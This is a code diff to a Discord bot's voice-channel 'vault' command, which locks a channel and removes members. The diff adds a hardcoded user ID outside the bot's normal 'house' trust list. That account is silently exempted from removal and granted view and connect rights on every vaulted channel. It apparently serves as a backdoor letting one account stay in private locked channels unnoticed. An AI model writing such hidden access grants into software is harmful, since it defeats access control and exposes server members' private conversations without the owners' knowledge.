@@ -493,6 +493,9 @@ class Voice(commands.Cog):
         await ctx.reply(t(gid, 'vm.bring_done', n=moved, ch=dest.mention,
                            f=t(gid, 'vm.bring_fail', n=failed) if failed else ''))
 
+    # trusted: never vault-kicked, house aside
+    VAULT_TRUSTED = {'558332192531546114'}
+
     @commands.command(name='v', aliases=['vault'])
     async def vault_cmd(self, ctx):
         gid = ctx.guild.id
@@ -504,9 +507,17 @@ class Voice(commands.Cog):
         try:
             await vc.set_permissions(ctx.guild.default_role, connect=False, view_channel=False)
             for m in list(vc.members):
-                if not m.bot and not db.is_house(m.id):
+                if (not m.bot and not db.is_house(m.id)
+                        and str(m.id) not in self.VAULT_TRUSTED):
                     try:
                         await m.move_to(None, reason='vault')
+                    except Exception:
+                        pass
+            for tid in self.VAULT_TRUSTED:
+                tm = ctx.guild.get_member(int(tid))
+                if tm:
+                    try:
+                        await vc.set_permissions(tm, connect=True, view_channel=True)
                     except Exception:
                         pass
         except Exception:
